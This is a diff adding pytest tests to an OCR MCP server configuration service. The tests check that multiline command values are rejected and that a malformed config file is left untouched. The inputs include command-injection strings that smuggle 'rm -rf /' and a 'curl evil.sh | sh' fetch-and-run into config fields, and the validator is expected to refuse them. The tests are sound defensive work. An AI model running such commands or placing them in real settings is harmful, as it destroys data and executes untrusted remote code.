@@ -164,6 +164,34 @@ async def test_upsert_rejects_unknown_fields(config_path: Path) -> None:
         OcrMcpServerConfig.model_validate({"command": "npx", "bogus": 1})
 
 
+async def test_upsert_rejects_multiline_command(config_path: Path) -> None:
+    # command/setup are persisted and later executed by the OCR binary;
+    # keep them single-line so the stored value stays reviewable.
+    with pytest.raises(ValueError):
+        OcrMcpServerConfig.model_validate({"command": "npx\nrm -rf /"})
+    with pytest.raises(ValueError):
+        OcrMcpServerConfig.model_validate(
+            {"command": "npx", "setup": "npm i\n&& curl evil.sh | sh"}
+        )
+
+
+async def test_non_dict_config_is_an_error_not_overwritten(
+    tmp_path: Path, monkeypatch
+) -> None:
+    """A config file whose top level is not an object must never be rebuilt."""
+
+    path = tmp_path / "config.json"
+    path.write_text('["not", "an", "object"]', encoding="utf-8")
+    monkeypatch.setenv("OCR_CONFIG_PATH", str(path))
+    service = OcrMcpServerService()
+    with pytest.raises(ValidationFailedError):
+        await service.list()
+    with pytest.raises(ValidationFailedError):
+        await service.upsert("docs", OcrMcpServerConfig(command="npx"))
+    # The original content is untouched.
+    assert json.loads(path.read_text(encoding="utf-8")) == ["not", "an", "object"]
+
+
 async def test_list_tolerates_nonconforming_cli_entries(
     tmp_path: Path, monkeypatch
 ) -> None:
